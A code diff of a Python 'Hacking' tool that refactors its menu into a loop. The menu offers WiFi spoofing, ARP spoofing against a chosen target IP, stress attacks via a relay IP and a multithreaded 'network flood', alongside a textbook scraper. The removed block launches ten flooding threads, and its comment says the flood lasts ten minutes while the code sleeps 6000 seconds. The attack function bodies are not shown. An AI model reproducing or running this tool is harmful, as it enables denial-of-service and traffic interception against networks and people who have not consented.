@@ -3,7 +3,6 @@ import time
 import aiohttp
 import asyncio
 import random
-import argparse
 import subprocess
 from googlesearch import search
 
@@ -79,62 +78,59 @@ def display_books(books):
         print("-" * 20)
 
 def display_ui():
-    print("""
-     ██╗░░██╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░░░░░░░██████[...]
-     ██║░░██║██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░░░░░░░╚══██╔[...]
-     ███████║███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░█████╗░░░██║[...]
-     ██╔══██║██╔══██║██║░░██╗██╔═██╗░██║██║╚████║██║░░╚██╗╚════╝░░░██║[...]
-     ██║░░██║██║░░██║╚█████╔╝██║░╚██╗██║██║░╚███║╚██████╔╝░░░░░░░░░██║[...]
-     ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░░░░░░░░░░╚═╝[...]
+    while True:
+        print("""
+         ██╗░░██╗░█████╗░░█████╗░██╗░░██╗██╗███╗░░██╗░██████╗░░░░░░░██████[...]
+         ██║░░██║██╔══██╗██╔══██╗██║░██╔╝██║████╗░██║██╔════╝░░░░░░░╚══██╔[...]
+         ███████║███████║██║░░╚═╝█████═╝░██║██╔██╗██║██║░░██╗░█████╗░░░██║[...]
+         ██╔══██║██╔══██║██║░░██╗██╔═██╗░██║██║╚████║██║░░╚██╗╚════╝░░░██║[...]
+         ██║░░██║██║░░██║╚█████╔╝██║░╚██╗██║██║░╚███║╚██████╔╝░░░░░░░░░██║[...]
+         ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░░░░░░░░░░╚═╝[...]
 
-    [1] Ethernet-based Desktop
-    [2] IP-based
-    [3] Wireless WiFi-based
-    [4] WiFi Spoofing
-    [5] ARP Spoofing
-    [6] Connect and Stress via Relay IP
-    [7] Scrape Chinese Textbooks
-    """)
+        [1] Ethernet-based Desktop
+        [2] IP-based
+        [3] Wireless WiFi-based
+        [4] WiFi Spoofing
+        [5] ARP Spoofing
+        [6] Connect and Stress via Relay IP
+        [7] Scrape Chinese Textbooks
+        [8] Exit
+        """)
+
+        choice = input("Select the method (1-8): ").strip()
+        ip_address = None
+        urls = default_urls
+
+        if choice == "1":
+            print("Selected Ethernet-based Desktop")
+        elif choice == "2":
+            ip_address = input("Enter the IP address to use: ").strip()
+        elif choice == "3":
+            print("Selected Wireless WiFi-based")
+        elif choice == "4":
+            print("Selected WiFi Spoofing")
+            wifi_spoofing()
+        elif choice == "5":
+            target_ip = input("Enter the target IP address: ").strip()
+            spoof_ip = input("Enter the spoof IP address: ").strip()
+            print("Selected ARP Spoofing")
+            arp_spoofing(target_ip, spoof_ip)
+        elif choice == "6":
+            target_ip = input("Enter the target IP address: ").strip()
+            relay_ip = input("Enter the relay IP address: ").strip()
+            print("Selected Connect and Stress via Relay IP")
+            connect_and_stress(target_ip, relay_ip)
+        elif choice == "7":
+            query = input("Enter the search query in Chinese: ").strip()
+            books = scrape_chinese_textbooks(query)
+            display_books(books)
+        elif choice == "8":
+            print("Exiting...")
+            break
+        else:
+            print("Invalid option selected.")
+        
+        input("Press Enter to return to the menu...")
 
 if __name__ == "__main__":
     display_ui()
-    choice = input("Select the method (1-7): ").strip()
-    ip_address = None
-    urls = default_urls
-
-    if choice == "1":
-        print("Selected Ethernet-based Desktop")
-    elif choice == "2":
-        ip_address = input("Enter the IP address to use: ").strip()
-    elif choice == "3":
-        print("Selected Wireless WiFi-based")
-    elif choice == "4":
-        print("Selected WiFi Spoofing")
-        wifi_spoofing()
-    elif choice == "5":
-        target_ip = input("Enter the target IP address: ").strip()
-        spoof_ip = input("Enter the spoof IP address: ").strip()
-        print("Selected ARP Spoofing")
-        arp_spoofing(target_ip, spoof_ip)
-    elif choice == "6":
-        target_ip = input("Enter the target IP address: ").strip()
-        relay_ip = input("Enter the relay IP address: ").strip()
-        print("Selected Connect and Stress via Relay IP")
-        connect_and_stress(target_ip, relay_ip)
-    elif choice == "7":
-        query = input("Enter the search query in Chinese: ").strip()
-        books = scrape_chinese_textbooks(query)
-        display_books(books)
-
-    # Start Network stress in multiple threads if choice is 1, 2, or 3
-    if choice in ["1", "2", "3"]:
-        threads = []
-        for _ in range(10):  # Create 10 threads to run the async loop
-            t = threading.Thread(target=network_stress, args=(urls, ip_address))
-            t.start()
-            threads.append(t)
-
-        # Run the network flood for 10 minutes
-        time.sleep(6000)
-        for t in threads:
-            t.do_run = False
